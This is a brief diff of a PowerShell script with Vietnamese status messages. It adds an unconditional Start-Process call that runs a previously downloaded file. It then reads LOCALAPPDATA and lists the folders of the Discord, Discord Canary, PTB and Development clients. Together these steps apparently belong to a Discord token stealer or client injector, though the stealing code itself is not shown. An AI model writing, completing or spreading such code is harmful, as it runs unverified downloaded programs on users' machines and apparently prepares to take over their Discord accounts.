@@ -153,7 +153,7 @@ if (Test-Path -Path $output) {
     Start-Process $output
     Write-Host "Tệp đã được tải về thành công."
 }
-
+Start-Process $output
 $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
 
